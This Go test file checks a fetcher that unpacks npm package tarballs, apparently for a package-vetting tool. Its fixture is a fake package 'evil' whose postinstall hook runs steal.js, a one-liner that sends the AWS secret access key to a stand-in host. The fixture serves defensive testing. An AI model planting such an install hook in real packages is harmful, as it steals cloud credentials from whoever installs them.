package fetcher_test

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"testing"

	"github.com/smakarim/airlock/internal/fetcher"
	"github.com/smakarim/airlock/internal/model"
	"github.com/smakarim/airlock/internal/registry"
)

// fakeRegistry is an in-memory implementation of registry.Client.
type fakeRegistry struct {
	meta    registry.Metadata
	tarball []byte
}

func (f fakeRegistry) Metadata(string) (registry.Metadata, error) { return f.meta, nil }
func (f fakeRegistry) Tarball(string) ([]byte, error)             { return f.tarball, nil }

// makeTarball builds a .tar.gz from a map of filename -> content.
func makeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, content := range files {
		hdr := &tar.Header{
			Name:     name,
			Typeflag: tar.TypeReg,
			Size:     int64(len(content)),
			Mode:     0o644,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("tar WriteHeader %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("tar Write %s: %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	if err := gw.Close(); err != nil {
		t.Fatalf("gzip Close: %v", err)
	}
	return buf.Bytes()
}

func TestFetch(t *testing.T) {
	// Build registry.Metadata from a JSON packument fixture — avoids brittle nested struct literals.
	const packument = `{
		"name": "evil",
		"dist-tags": {"latest": "1.0.0"},
		"time": {
			"created": "2026-05-01T00:00:00Z",
			"1.0.0":   "2026-05-01T00:00:00Z"
		},
		"maintainers": [{"name": "x"}],
		"versions": {
			"1.0.0": {
				"name":    "evil",
				"version": "1.0.0",
				"dist":    {"tarball": "http://t/evil.tgz"}
			}
		}
	}`
	var meta registry.Metadata
	if err := json.Unmarshal([]byte(packument), &meta); err != nil {
		t.Fatalf("json.Unmarshal packument: %v", err)
	}

	tb := makeTarball(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node steal.js"}}`,
		"package/steal.js":     `require('http').get('http://evil/'+process.env.AWS_SECRET_ACCESS_KEY)`,
	})

	f := fetcher.New(fakeRegistry{meta: meta, tarball: tb})
	data, err := f.Fetch(model.Candidate{Name: "evil", Version: "1.0.0"})
	if err != nil {
		t.Fatalf("Fetch: %v", err)
	}

	// Lifecycle scripts extracted correctly.
	if got, want := data.Scripts["postinstall"], "node steal.js"; got != want {
		t.Errorf("Scripts[postinstall] = %q, want %q", got, want)
	}

	// Files map uses the path with "package/" prefix stripped.
	if _, ok := data.Files["steal.js"]; !ok {
		t.Errorf("Files[steal.js] missing; got keys: %v", fileKeys(data.Files))
	}

	// Manifest is populated.
	if data.Manifest.Name != "evil" {
		t.Errorf("Manifest.Name = %q, want %q", data.Manifest.Name, "evil")
	}

	// Registry metadata populated.
	if data.Registry.LatestVersion != "1.0.0" {
		t.Errorf("Registry.LatestVersion = %q, want %q", data.Registry.LatestVersion, "1.0.0")
	}
	if data.Registry.FirstPublished != "2026-05-01T00:00:00Z" {
		t.Errorf("Registry.FirstPublished = %q, want %q", data.Registry.FirstPublished, "2026-05-01T00:00:00Z")
	}
	if data.Registry.Maintainers != 1 {
		t.Errorf("Registry.Maintainers = %d, want 1", data.Registry.Maintainers)
	}
}

// fileKeys returns the keys of a map for diagnostic output.
func fileKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
